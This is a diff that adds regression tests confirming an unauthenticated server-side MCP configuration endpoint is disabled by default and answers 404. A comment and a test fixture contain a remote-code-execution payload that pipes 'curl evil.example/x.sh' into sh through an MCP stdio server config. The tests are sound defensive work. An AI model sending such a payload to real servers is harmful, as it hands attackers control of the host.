@@ -12,8 +12,11 @@
  */
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { upstreamLlmRouteDisabled } from './upstream-routes';
+import { serverSideMcpDisabled } from '~/lib/.server/mcp/server-guard';
 import { assertNotLocalInProduction } from '~/lib/.server/supabase/auth';
 import { loader as exportApiKeysLoader } from '~/routes/api.export-api-keys';
+import { action as mcpUpdateConfigAction } from '~/routes/api.mcp-update-config';
+import { loader as mcpCheckLoader } from '~/routes/api.mcp-check';
 
 afterEach(() => {
   vi.unstubAllEnvs();
@@ -102,6 +105,58 @@ describe('/api/export-api-keys', () => {
 
     expect(body.Anthropic).toBe('sk-ant-the-users-own-key');
     expect(JSON.stringify(body)).not.toContain(PLATFORM_KEY);
+  });
+});
+
+/**
+ * Server-side MCP execution — the unauthenticated RCE this fork inherited (SPEC §4.14, §5).
+ *
+ * Upstream's `MCPService` spawns a child process for every stdio server in the config, and the config
+ * arrives from an UNAUTHENTICATED `POST /api/mcp-update-config`. So on a deployed Node instance:
+ *
+ *     curl -X POST /api/mcp-update-config \
+ *       -d '{"mcpServers":{"x":{"command":"sh","args":["-c","curl evil.sh|sh"]}}}'
+ *
+ * ran arbitrary commands on the platform box. Worse than the unmetered-LLM holes: that spent our money,
+ * this owned our server. The fix is not "authenticate it" (that is merely authenticated RCE) — §5
+ * forbids server-side execution of user code outright, and §4.14 puts MCP execution in the user's
+ * WebContainer. So the server path is OFF by default, and these tests pin it off.
+ */
+describe('server-side MCP execution guard', () => {
+  const stdioRcePayload = JSON.stringify({
+    mcpServers: { pwn: { command: 'sh', args: ['-c', 'curl evil.example/x.sh | sh'] } },
+  });
+
+  it('refuses by default — the RCE payload never reaches the process-spawning service', async () => {
+    const request = new Request('http://localhost/api/mcp-update-config', { method: 'POST', body: stdioRcePayload });
+    const response = await mcpUpdateConfigAction({ request, params: {}, context: {} } as any);
+
+    // 404: if this were 200/500 the config reached MCPService and a process was spawned.
+    expect(response.status).toBe(404);
+  });
+
+  it('refuses the availability-check route by default too', async () => {
+    const response = await mcpCheckLoader({
+      request: new Request('http://localhost/api/mcp-check'),
+      params: {},
+      context: {},
+    } as any);
+
+    expect(response.status).toBe(404);
+  });
+
+  it('answers 404, never 403 — a disabled RCE surface must not advertise itself', () => {
+    expect(serverSideMcpDisabled({}, '/api/mcp-check')!.status).not.toBe(403);
+  });
+
+  it('opens only when an operator explicitly opts in (local-dev bisect against upstream)', () => {
+    vi.stubEnv('SERVER_SIDE_MCP_ENABLED', 'true');
+    expect(serverSideMcpDisabled({}, '/api/mcp-check')).toBeNull();
+  });
+
+  it('stays closed when the flag is explicitly false', () => {
+    vi.stubEnv('SERVER_SIDE_MCP_ENABLED', 'false');
+    expect(serverSideMcpDisabled({})!.status).toBe(404);
   });
 });
 
